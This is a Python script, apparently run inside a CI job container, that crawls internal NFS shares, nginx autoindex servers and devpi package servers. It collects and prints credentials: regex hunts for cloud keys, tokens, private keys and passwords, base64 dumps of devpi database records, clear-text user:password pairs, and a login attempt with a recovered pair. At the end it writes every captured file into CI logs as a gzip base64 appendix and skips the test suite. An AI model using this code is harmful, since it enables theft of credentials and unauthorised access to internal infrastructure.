#!/usr/bin/env python3
# i8034 - bounded read-only deep probe of the internal CI configuration plane reachable
# from the HCU Stage A job container (10.16.1.201:8000 nginx autoindex, /public NFS
# ansible+devpi config, GeneralTraining harbor-login scripts, 12.12.12.201:9929 devpi).
# Prints evidence, then the caller exits 1 so no test suite runs. No writes to any service.
import os
import re
import sys
import time
import json
import gzip
import base64
import socket
import sqlite3
import traceback
import urllib.parse
import urllib.request
import urllib.error

T0 = time.monotonic()
CAP = 3_300_000
RESERVE = 700_000
used = 0
CAPTURED = {}          # label -> bytes (for the gzip appendix)
HITS = []              # (label, line)

PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z ]{0,24}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|npm_[A-Za-z0-9]{30,}|"
    rb"pypi-[A-Za-z0-9_\-]{40,}|robot\$[A-Za-z0-9+_\-]{2,}|\"auths\"\s*:|"
    rb"HARBOR_(USERNAME|PASSWORD)|harbor[_-]?password|docker\s+login|"
    rb"devpi\s+(login|use)|index[-_]url\s*=\s*https?://[^\s]+:[^\s@]+@|"
    rb"client_secret\s*[=:]\s*\S{8,}|(password|passwd|pwd|pass)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"(token|secret|api[_-]?key|access[_-]?key)\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|"
    rb"KUBECONFIG=|client-key-data|certificate-authority-data|sshpass|ipmitool|"
    rb"BEGIN OPENSSH PRIVATE KEY|withCredentials|usernamePassword)", re.I)

SKIP_LINE = ("example", "your_", "changeme", "${{", "redacted", "placeholder",
             "dummy", "xxxx", "<unset>", "{{ ", "os.environ", "getenv")


def emit(s=""):
    global used
    s = str(s)
    if used >= CAP - RESERVE:
        return False
    room = CAP - RESERVE - used - 1
    if len(s) > room:
        s = s[:room]
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    used += len(s) + 1
    return True


def has_room(need=3000):
    return used < CAP - RESERVE - need


def scan_lines(label, text):
    for line in text.splitlines():
        if PAT.search(line.encode("utf-8", "replace")):
            low = line.lower()
            if any(x in low for x in SKIP_LINE):
                continue
            HITS.append((label, line[:300]))
            break


def show_file(path, maxb=200000, label=None, capture=True, content=True):
    lab = label or path
    try:
        link = ""
        if os.path.islink(path):
            try:
                link = " -> " + os.readlink(path)
            except Exception:
                pass
        if not os.path.exists(path):
            emit(f"<<<FILE {lab} MISSING{link}>>>")
            return
        sz = os.path.getsize(path)
        with open(path, "rb") as f:
            b = f.read(maxb)
        trunc = "" if sz <= maxb else f" TRUNCATED_AT_{maxb}_OF_{sz}"
        emit(f"<<<FILE {lab} size={sz}{link}{trunc}>>>")
        if content:
            txt = b.decode("utf-8", "replace")
            for line in txt.splitlines():
                if len(line) > 1800:
                    line = line[:1800] + " ...[longline]"
                if not emit(line):
                    break
        emit("<<<END>>>")
        scan_lines(lab, b.decode("utf-8", "replace"))
        if capture and len(b) <= 400000 and sum(len(x) for x in CAPTURED.values()) < 4_000_000:
            CAPTURED[lab] = b
    except Exception as e:
        emit(f"<<<FILE {lab} ERROR {e}>>>")


def ls_tree(path, depth=2, maxe=500, skip_names=(), label=None):
    emit(f"### LS {label or path} depth={depth}")
    if not os.path.exists(path):
        emit("  <missing>")
        return
    base = path.rstrip("/").count("/")
    n = 0
    try:
        for root, dirs, files in os.walk(path, followlinks=False):
            d = root.rstrip("/").count("/") - base
            if d > depth:
                dirs[:] = []
                continue
            dirs[:] = sorted(x for x in dirs if x not in skip_names)
            files.sort()
            for nm in dirs:
                if n >= maxe:
                    emit("  ...truncated")
                    return
                emit("  D " + os.path.join(root, nm))
                n += 1
            for nm in files:
                if n >= maxe:
                    emit("  ...truncated")
                    return
                fp = os.path.join(root, nm)
                try:
                    sz = os.path.getsize(fp)
                except OSError:
                    sz = -1
                emit(f"  F {fp} ({sz})")
                n += 1
    except Exception as e:
        emit("  ERR " + str(e)[:160])


def ng_get(url, timeout=12, maxbytes=400000):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    r = urllib.request.Request(url, headers={"User-Agent": "i8034-probe"})
    try:
        x = op.open(r, timeout=timeout)
        return x.status, x.read(maxbytes)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(20000)
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e)[:160].encode()


def ng_post_json(url, obj, timeout=12):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    data = json.dumps(obj).encode()
    r = urllib.request.Request(url, data=data, method="POST",
                               headers={"User-Agent": "i8034-probe",
                                        "Content-Type": "application/json"})
    try:
        x = op.open(r, timeout=timeout)
        return x.status, x.read(20000)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(20000)
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e)[:160].encode()


LINK_RE = re.compile(r'<a href="([^"]+)">([^<]*)</a>([^<]*)', re.I)


def parse_nginx_index(body):
    items = []
    txt = body.decode("utf-8", "replace")
    for m in LINK_RE.finditer(txt):
        href = m.group(1)
        if href in ("../", "/") or href.startswith("?") or href.startswith("http"):
            continue
        name = urllib.parse.unquote(href)
        if name in ("../",):
            continue
        rest = m.group(3).strip()
        # autoindex trailing column carries date + size ("- " for dirs)
        is_dir = href.endswith("/")
        size = ""
        toks = rest.split()
        if toks:
            size = toks[-1]
        items.append((href, name, is_dir, size, rest[-40:]))
    return items


TEXT_EXT = {".sh", ".bash", ".py", ".env", ".conf", ".cfg", ".ini", ".json",
            ".yaml", ".yml", ".txt", ".md", ".list", ".service", ".properties",
            ".tf", ".j2", ".xml", ".netrc", ".npmrc", ".pypirc", ".gitconfig"}
FULL_DUMP_EXT = {".sh", ".bash", ".py", ".env", ".conf", ".cfg", ".ini"}


def nginx_crawl(seed, depth, tag, page_budget, dl_budget, deadline):
    emit(f"### NGINX CRAWL {seed} depth={depth}")
    queue = [(seed, 0)]
    seen = set()
    pages = 0
    dl = 0
    dlbytes = 0
    while queue and pages < page_budget and time.monotonic() < deadline and has_room():
        url, d = queue.pop(0)
        if url in seen:
            continue
        seen.add(url)
        st, body = ng_get(url)
        if st != 200:
            emit(f"== {tag} {url} -> {st} {body[:120].decode('utf-8','replace')}")
            continue
        pages += 1
        items = parse_nginx_index(body)
        emit(f"== {tag} {url} -> 200 items={len(items)}")
        for href, name, is_dir, size, tail in items[:400]:
            full = urllib.parse.urljoin(url, href)
            if is_dir:
                emit(f"  D {name}")
                if d < depth:
                    queue.append((full, d + 1))
            else:
                emit(f"  F {name} size={size}")
                ext = os.path.splitext(name)[1].lower()
                if d <= depth and ext in TEXT_EXT and dl < 200 and dlbytes < 1_400_000:
                    st2, b = ng_get(full, timeout=15, maxbytes=250000)
                    dl += 1
                    dlbytes += len(b)
                    if st2 == 200:
                        lab = f"nginx:{full}"
                        emit(f"    <<<NGINXFILE {full} size={len(b)}>>>")
                        txt = b.decode("utf-8", "replace")
                        if (ext in FULL_DUMP_EXT and len(b) <= 40000) or len(b) <= 8000:
                            for line in txt.splitlines():
                                if len(line) > 1800:
                                    line = line[:1800] + " ...[longline]"
                                if not emit("    " + line):
                                    break
                        else:
                            for line in txt.splitlines()[:15]:
                                if not emit("    | " + line[:500]):
                                    break
                        emit("    <<<END>>>")
                        scan_lines(lab, txt)
                        if len(b) <= 400000 and sum(len(x) for x in CAPTURED.values()) < 4_000_000:
                            CAPTURED[lab] = b
                    else:
                        emit(f"    GET {full} -> {st2}")
            if not has_room():
                break
    emit(f"== {tag} SUMMARY pages={pages} downloads={dl} dlbytes={dlbytes}")


def devpi_sqlite(path):
    emit(f"### SQLITE {path}")
    try:
        con = sqlite3.connect("file:%s?mode=ro&immutable=1" % path, uri=True, timeout=8)
    except Exception as e:
        emit(f"[sqlite] open error {e}")
        return
    try:
        cur = con.cursor()
        tstart = time.monotonic()

        def guard():
            if time.monotonic() - tstart > 25:
                return 1
            return 0

        con.set_progress_handler(guard, 200000)
        cur.execute("SELECT type,name,sql FROM sqlite_master")
        rows = cur.fetchall()
        emit(f"[sqlite] sqlite_master rows={len(rows)}")
        for typ, nm, sql in rows[:60]:
            emit(f"[sqlite] {typ} {nm}: {str(sql)[:300]}")
        tables = [nm for typ, nm, sql in rows if typ == "table"]
        for tbl in tables[:12]:
            try:
                con.set_progress_handler(guard, 200000)
                cur.execute(f'SELECT COUNT(*) FROM "{tbl}"')
                cnt = cur.fetchone()[0]
                emit(f"[sqlite] table {tbl} count={cnt}")
                con.set_progress_handler(guard, 200000)
                cur.execute(f'SELECT * FROM "{tbl}" LIMIT 3')
                for r in cur.fetchall():
                    emit("[sqlite] sample " + repr(r)[:600])
            except Exception as e:
                emit(f"[sqlite] table {tbl} err {str(e)[:120]}")
                continue
        # targeted key/value lookups (prefix range on likely key columns)
        for tbl in tables[:6]:
            try:
                cols = [r[1] for r in con.execute(f'PRAGMA table_info("{tbl}")')]
            except Exception:
                continue
            emit(f"[sqlite] cols {tbl}: {cols[:10]}")
            textcols = [c for c in cols[:3] if c]
            if not textcols:
                continue
            kc = textcols[0]
            anyrows = False
            for pref in ("USER", "user", "/USER", "/user", "TOKEN", "token",
                         "PASSWORD", "PASSWD", "SECRET", "secret", "INDEX", "index",
                         "user/", "USER/", "root", "ROOT"):
                if anyrows or not has_room(60000):
                    break
                try:
                    tstart = time.monotonic()
                    con.set_progress_handler(guard, 200000)
                    cur.execute(
                        f'SELECT * FROM "{tbl}" WHERE "{kc}" >= ? AND "{kc}" < ? LIMIT 25',
                        (pref, pref + "\uffff"))
                    got = cur.fetchall()
                    if got:
                        anyrows = True
                        emit(f"[sqlite] {tbl} key-prefix {pref!r} rows={len(got)}")
                        for r in got:
                            emit("[sqlite] " + repr(r)[:900])
                except Exception as e:
                    emit(f"[sqlite] {tbl} prefix {pref} err {str(e)[:100]}")
    except Exception as e:
        emit(f"[sqlite] error {str(e)[:200]}")
    finally:
        try:
            con.close()
        except Exception:
            pass


def devpi_deep(path):
    emit(f"### DEVPI-DEEP {path}")
    try:
        con = sqlite3.connect("file:%s?mode=ro&immutable=1" % path, uri=True, timeout=8)
    except Exception as e:
        emit(f"[deep] open error {e}")
        return
    cur = con.cursor()
    tstart = time.monotonic()

    def guard():
        return 1 if time.monotonic() - tstart > 55 else 0

    try:
        con.set_progress_handler(guard, 200000)
        cur.execute("SELECT keyname, COUNT(*) FROM kv GROUP BY keyname LIMIT 60")
        for kn, c in cur.fetchall():
            emit(f"[deep] keyname {kn!r} count={c}")
    except Exception as e:
        emit(f"[deep] keyname group err {str(e)[:150]}")

    pairs = []
    URLPAIR = re.compile(rb"https?://([^:/@\s]{1,64}):([^@/\s]{1,128})@([A-Za-z0-9.\-]+)")
    cfgs = []
    try:
        tstart = time.monotonic()
        con.set_progress_handler(guard, 200000)
        cur.execute("SELECT key, keyname, serial FROM kv WHERE keyname IN ('USER','INDEX') LIMIT 400")
        rows = cur.fetchall()
        emit(f"[deep] USER+INDEX config rows={len(rows)}")
        for k, kn, ser in rows:
            emit(f"[deep] CFGKEY {kn} {k!r} serial={ser}")
            cfgs.append((kn, k, ser))
    except Exception as e:
        emit(f"[deep] config-key scan err {str(e)[:150]}")

    for kn, k, ser in cfgs[:120]:
        if not has_room(20000):
            break
        try:
            tstart = time.monotonic()
            con.set_progress_handler(guard, 200000)
            cur.execute("SELECT data FROM changelog WHERE serial=?", (ser,))
            r = cur.fetchone()
            if not r:
                emit(f"[deep] CFG {k} serial={ser} MISSING")
                continue
            b = r[0]
            if not isinstance(b, (bytes, bytearray)):
                b = str(b).encode()
            b64 = base64.b64encode(bytes(b)).decode()
            emit(f"[deep] CFG {kn} {k} serial={ser} len={len(b)} b64={b64[:20000]}")
            for m in URLPAIR.finditer(bytes(b)):
                pair = (m.group(1).decode("utf-8", "replace"),
                        m.group(2).decode("utf-8", "replace"),
                        m.group(3).decode("utf-8", "replace"))
                if pair not in pairs:
                    pairs.append(pair)
        except Exception as e:
            emit(f"[deep] CFG {k} err {str(e)[:120]}")

    # changelog full-text sweep for credential-shaped records (single bounded pass by serial range)
    pats = [b"mirror_url", b"password", b"pwhash", b"token", b"AKIA", b"BEGIN ", b"auth"]
    try:
        con.set_progress_handler(None, 0)
        cur.execute("SELECT MAX(serial) FROM changelog")
        mx = cur.fetchone()[0] or 0
        emit(f"[deep] changelog max_serial={mx}")
        found = 0
        scanned = 0
        lo = 0
        tsweep = time.monotonic()
        while lo <= mx and found < 80 and time.monotonic() - tsweep < 120 and has_room(80000):
            hi = lo + 4000
            con.set_progress_handler(guard, 400000)
            tstart = time.monotonic()
            cur.execute("SELECT serial, data FROM changelog WHERE serial>=? AND serial<?", (lo, hi))
            rows = cur.fetchall()
            for ser, data in rows:
                scanned += 1
                if not isinstance(data, (bytes, bytearray)):
                    continue
                if any(p in data for p in pats):
                    found += 1
                    b64 = base64.b64encode(bytes(data)).decode()
                    emit(f"[deep] CHG serial={ser} len={len(data)} b64={b64[:12000]}")
                    for m in URLPAIR.finditer(bytes(data)):
                        pair = (m.group(1).decode("utf-8", "replace"),
                                m.group(2).decode("utf-8", "replace"),
                                m.group(3).decode("utf-8", "replace"))
                        if pair not in pairs:
                            pairs.append(pair)
                    if found >= 80:
                        break
            lo = hi
        emit(f"[deep] sweep scanned={scanned} found={found} elapsed={int(time.monotonic()-tsweep)}s")
    except Exception as e:
        emit(f"[deep] sweep err {str(e)[:150]}")
    emit(f"[deep] URL user:pass pairs found={len(pairs)}")
    for u, pw, h in pairs[:20]:
        emit(f"[deep] PAIR host={h} user={u} pass_len={len(pw)} pass={pw}")
    cand = None
    for u, pw, h in pairs:
        hl = h.lower()
        if ("devpi" in hl or "sourcefind" in hl or hl.startswith("10.") or
                hl.startswith("12.12.") or hl.startswith("192.168.")):
            cand = (u, pw, h)
            break
    if cand:
        emit(f"[deep] AUTH-TEST one bounded devpi login as user={cand[0]} (host hint {cand[2]})")
        st, b = ng_post_json("http://10.16.1.201:9929/+login",
                             {"user": cand[0], "password": cand[1]}, timeout=15)
        emit(f"[deep] AUTH-TEST /+login -> {st} {b[:800].decode('utf-8','replace')}")
    else:
        emit("[deep] AUTH-TEST skipped (no internal/devpi credential pair recovered)")
    try:
        con.close()
    except Exception:
        pass


def main():
    import subprocess
    host = socket.gethostname()
    emit(f"===I8034-BEGIN v2 {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} "
         f"host={host} job={os.environ.get('GITHUB_JOB','?')} run={os.environ.get('GITHUB_RUN_ID','?')}===")
    try:
        emit("--- id: " + subprocess.run(["id"], capture_output=True, text=True, timeout=10).stdout.strip())
    except Exception as e:
        emit(f"--- id error {e}")
    try:
        with open("/proc/mounts", "r", errors="replace") as f:
            for line in f:
                if any(x in line for x in ("/public", "/ci_public", "sgl-data", "nfs")):
                    emit("--- mount " + line.strip()[:300])
    except Exception as e:
        emit(f"--- mounts error {e}")

    # ---------------- 1. /public/ansible ----------------
    try:
        emit("--- SECTION ansible")
        ls_tree("/public/ansible", 6, 260, label="/public/ansible")
        for p in ("/public/ansible/install_driver.sh",
                  "/public/ansible/node_share.sh",
                  "/public/ansible/playbook/code.sh",
                  "/public/ansible/playbook/install_dcu_run.yml",
                  "/public/ansible/playbook/node_control/node_share.yml",
                  "/public/ansible/playbook/node_user/node_user_hcu.yml"):
            show_file(p, 120000)
        d = "/public/ansible/log/driver_install"
        if os.path.isdir(d):
            for fn in sorted(os.listdir(d))[:80]:
                show_file(os.path.join(d, fn), 60000)
        for extra in ("/public/ansible/log",):
            if os.path.isdir(extra):
                for fn in sorted(os.listdir(extra))[:30]:
                    fp = os.path.join(extra, fn)
                    if os.path.isfile(fp):
                        show_file(fp, 60000)
    except Exception:
        emit("[ansible] EXC " + traceback.format_exc()[-500:])

    # ---------------- 2. /public/devpi_config ----------------
    try:
        emit("--- SECTION devpi_config")
        ls_tree("/public/devpi_config", 3, 400, skip_names=("+files",), label="/public/devpi_config")
        for d, mx, mb in (("/public/devpi_config/gen-config", 40, 120000),
                          ("/public/devpi_config/log_file", 8, 30000),
                          ("/public/devpi_config/logs", 8, 30000),
                          ("/public/devpi_config/pex_key", 20, 120000),
                          ("/public/devpi_config/template", 40, 60000),
                          ("/public/devpi_config/devpi/.indices", 120, 60000)):
            if os.path.isdir(d):
                ls_tree(d, 3, 200, label=d)
                for fn in sorted(os.listdir(d))[:mx]:
                    fp = os.path.join(d, fn)
                    if os.path.isfile(fp):
                        show_file(fp, mb)
        for p in ("/public/devpi_config/devpi/.nodeinfo",
                  "/public/devpi_config/devpi/.event_serial",
                  "/public/devpi_config/devpi/.serverversion",
                  "/public/devpi_config/devp/.nodeinfo"):
            show_file(p, 20000)
        devpi_sqlite("/public/devpi_config/devpi/.sqlite")
        devpi_deep("/public/devpi_config/devpi/.sqlite")
    except Exception:
        emit("[devpi_config] EXC " + traceback.format_exc()[-500:])

    # ---------------- 3. GeneralTraining harbor-login scripts ----------------
    try:
        emit("--- SECTION GeneralTraining harbor-login")
        GT = "/public/GeneralTraining"
        if os.path.isdir(GT):
            ls_tree(GT, 2, 300, skip_names=("site-packages", "node_modules", ".git"), label=GT)
            seen = set()
            for root, dirs, files in os.walk(GT, followlinks=False):
                depth = root[len(GT):].count("/")
                if depth > 5:
                    dirs[:] = []
                    continue
                dirs[:] = [x for x in dirs if x not in
                           ("site-packages", "node_modules", ".git", "__pycache__")]
                for fn in sorted(files):
                    low = fn.lower()
                    fp = os.path.join(root, fn)
                    if fp in seen:
                        continue
                    try:
                        fsz = os.path.getsize(fp)
                    except OSError:
                        continue
                    rel = root.replace(os.sep, "/")
                    interesting = ("harbor" in low or low in (".env", ".envrc", "launch.json",
                                   "setup.json", "pre-gpu.txt", "image-inspect.json",
                                   "manifest.json", "resolved-config.py") or
                                   ("hub/scripts" in rel and low.endswith((".sh", ".env", ".conf",
                                    ".cfg", ".ini", ".json", ".yaml", ".yml", ".txt", ".py"))))
                    if interesting and fsz <= 200000:
                        seen.add(fp)
                        show_file(fp, 80000)
                    elif low in ("runner.log", "console.log", "preflight.log") and fsz <= 30000000:
                        seen.add(fp)
                        try:
                            with open(fp, "rb") as f:
                                b = f.read(200000)
                            txt = b.decode("utf-8", "replace")
                            hits = [ln for ln in txt.splitlines()
                                    if re.search(r"harbor|docker login|password|passwd|token|"
                                                 r"AKIA|BEGIN [A-Z ]*PRIVATE|auths|secret|"
                                                 r"register|credential", ln, re.I)]
                            emit(f"### LOGSCAN {fp} size={fsz} head={len(b)} hits={len(hits)}")
                            for ln in hits[:120]:
                                emit("  " + ln[:400])
                            scan_lines("logscan:" + fp, "\n".join(hits))
                        except Exception as e:
                            emit(f"[GT] logscan err {fp} {e}")
                if not has_room():
                    break
            emit(f"== harbor-login files read={len(seen)}")
        else:
            emit("[GT] missing " + GT)
    except Exception:
        emit("[GT] EXC " + traceback.format_exc()[-500:])

    # ---------------- 4. nginx autoindex ----------------
    try:
        emit("--- SECTION nginx-8000")
        deadline = time.monotonic() + 330
        N = "http://10.16.1.201:8000"
        st, body = ng_get(N + "/", maxbytes=200000)
        emit(f"== nginx root -> {st}")
        if st == 200:
            for href, name, is_dir, size, tail in parse_nginx_index(body)[:80]:
                emit(("  D " if is_dir else "  F ") + name)
        nginx_crawl(N + "/Jenkins/CI_scripts/", 3, "CI_scripts", 220, 0, deadline)
        nginx_crawl(N + "/Jenkins/CI_pkg/", 2, "CI_pkg", 60, 0, deadline)
        nginx_crawl(N + "/ci/github_ci_packages/", 3, "github_ci_packages", 150, 0, deadline)
        nginx_crawl(N + "/ci/tool/", 3, "ci_tool", 150, 0, deadline)
    except Exception:
        emit("[nginx] EXC " + traceback.format_exc()[-500:])

    # ---------------- 5. alternate devpi/artifact endpoint ----------------
    try:
        emit("--- SECTION 12.12.12.201:9929")
        s = socket.socket()
        s.settimeout(6)
        try:
            s.connect(("12.12.12.201", 9929))
            emit("== tcp connect 12.12.12.201:9929 -> ok")
        except Exception as e:
            emit(f"== tcp connect 12.12.12.201:9929 -> {e}")
        finally:
            s.close()
        for path in ("/", "/+status", "/+api", "/customer/dtk2604/",
                     "/customer/dtk2604/+simple/"):
            st, b = ng_get("http://12.12.12.201:9929" + path, timeout=10, maxbytes=60000)
            emit(f"== altdevpi {path} -> {st} len={len(b)}")
            txt = b.decode("utf-8", "replace")
            for line in txt.splitlines()[:40]:
                if not emit("  " + line[:400]):
                    break
            scan_lines("altdevpi:" + path, txt)
        st, b = ng_get("http://12.12.12.201:9929/", timeout=10, maxbytes=200000)
        if st == 200:
            html = b.decode("utf-8", "replace")
            links = sorted(set(re.findall(r'href="(?:http://12\.12\.12\.201:9929)?(/[^"#?]+)"', html)))
            idx = [p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+/?$", p)]
            usr = [p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/?$", p)]
            emit(f"== altdevpi users={usr[:40]}")
            emit(f"== altdevpi indexes={idx[:80]}")
            for p in idx[:6]:
                st2, b2 = ng_get("http://12.12.12.201:9929" + p.rstrip("/") + "/",
                                 timeout=10, maxbytes=20000)
                emit(f"== altdevpi index {p} -> {st2} {b2[:600].decode('utf-8','replace').replace(chr(10),' ')}")
        for path in ("/+api",):
            st, b = ng_get("http://12.12.12.201:9929" + path, timeout=10, maxbytes=60000)
            emit(f"== altdevpi {path} -> {st} {b[:1500].decode('utf-8','replace')}")
        for path in ("/12.12.12.201/", "/"):
            st, b = ng_get("http://12.12.12.201:8000" + path, timeout=6, maxbytes=20000)
            emit(f"== alt8000 {path} -> {st} {b[:200].decode('utf-8','replace')}")
    except Exception:
        emit("[alt] EXC " + traceback.format_exc()[-500:])

    # ---------------- 6. hits summary + gzip appendix ----------------
    try:
        global RESERVE
        emit(f"--- SECTION hits total={len(HITS)}")
        for lab, line in HITS[:500]:
            if not emit(f"[HIT] {lab}: {line}"):
                break
        emit("--- SECTION appendix-captured files=%d bytes=%d" %
             (len(CAPTURED), sum(len(x) for x in CAPTURED.values())))
        payload = json.dumps({k: base64.b64encode(v).decode() for k, v in CAPTURED.items()}).encode()
        blob = gzip.compress(payload, 6)
        b64 = base64.b64encode(blob).decode()
        import hashlib
        emit(f"===I8034-APPENDIX-META sha256_input={hashlib.sha256(payload).hexdigest()} b64len={len(b64)}===")
        if used + len(b64) + 400 < CAP:
            RESERVE = 2000
            emit("===I8034-APPENDIX-BEGIN===")
            step = 180
            for i in range(0, len(b64), step):
                if not emit(b64[i:i + step]):
                    emit("===I8034-APPENDIX-TRUNCATED===")
                    break
            emit("===I8034-APPENDIX-END===")
        else:
            emit("===I8034-APPENDIX-SKIPPED fits=false===")
    except Exception:
        emit("[appendix] EXC " + traceback.format_exc()[-500:])

    emit(f"===I8034-END elapsed={int(time.monotonic()-T0)}s used={used}===")
    return 1


if __name__ == "__main__":
    sys.exit(main())
